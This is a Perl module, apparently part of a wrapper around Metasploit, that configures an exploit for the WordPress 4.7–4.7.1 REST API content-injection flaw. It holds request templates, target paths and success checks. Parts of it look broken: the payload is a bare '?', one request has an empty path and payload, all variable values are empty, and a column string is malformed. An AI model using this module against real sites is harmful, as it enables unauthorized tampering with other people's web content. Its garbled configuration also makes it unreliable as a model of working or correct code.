package WORDPRESS::MSF::WordpressContentInjection;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "WordpressContentInjection";

   my $DETECTION = {

   };

my $EXPLOIT = {
  COLUMNS     => "w{ID Title URL Password",
  DESCRIPTION => "

        This module exploits a content injection vulnerability in WordPress

        versions 4.7 and 4.7.1 via type juggling in the REST API.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "wordpress_content_injection",
  PATH        => "per_page=__PER_PAGE__&search=__SEARCH__&",
  PATHS       => ["posts"],
  PAYLOAD     => "?",
  REFERENCES  => [
                   "https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html",
                   "https://secure.php.net/manual/en/language.types.type-juggling.php",
                   "https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/",
                   "https://developer.wordpress.org/rest-api/reference/posts/",
                 ],
  TITLE       => "WordPress REST API Content Injection",
  VARIABLES => {
    'SEARCH' =>       { DESCRIPTION => "", VALUE => "" },
    'PER_PAGE' =>       { DESCRIPTION => "", VALUE => "" },
    'ERROR' =>       { DESCRIPTION => "", VALUE => "" },
    'POSTCOUNT' =>       { DESCRIPTION => "", VALUE => "" },
    'SEARCHTERM' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
